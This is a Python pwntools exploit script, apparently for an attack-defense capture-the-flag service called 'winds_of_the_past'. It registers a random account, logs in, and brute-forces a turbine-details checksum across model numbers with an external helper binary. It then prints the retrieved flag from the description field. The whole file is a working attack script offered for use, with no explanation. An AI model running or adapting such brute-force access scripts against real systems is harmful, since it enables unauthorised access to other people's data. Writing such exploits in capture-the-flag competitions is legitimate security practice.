#!/usr/bin/env python3
from winds_of_the_past import *

from pwn import *
import re
import subprocess
import sys


def exploit(ip: str, flag_id: str):
    with remote(ip, PORT) as r:
        r.recvuntil(Menu.MENU_END.value)

        # Register user
        username = randoms(20).encode()
        password = randoms(20).encode()
        r.sendline(Menu.REGISTER_USER.value)
        r.sendline(username)
        r.sendline(password)
        r.recvuntil(Menu.MENU_END.value)

        # Login as registered user
        r.sendline(Menu.LOGIN.value)
        r.sendline(username)
        r.sendline(password)
        r.recvuntil(Menu.MENU_END.value)

        # Bruteforce checksum
        for modelnumber in range(1, NUM_MODELNUMBERS + 1):
            r.sendline(Menu.SHOW_TURBINE_DETAILS.value)
            r.sendline(flag_id.encode())
            checksum = subprocess.check_output(["./exploit2_checksum", flag_id, str(modelnumber)])
            r.sendline(checksum)

            turbine_details = r.recvuntil(Menu.MENU_END.value)

            # Check if flag was found
            m = re.search(b"Description: (.+)", turbine_details)
            if m:
                print(m.group(1).strip().decode())
                break

        # Exit
        r.sendline(Menu.EXIT.value)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.stderr.write(f"Usage: {sys.argv[0]} IP FLAG_ID\n")
        sys.exit(1)

    exploit(sys.argv[1], sys.argv[2])
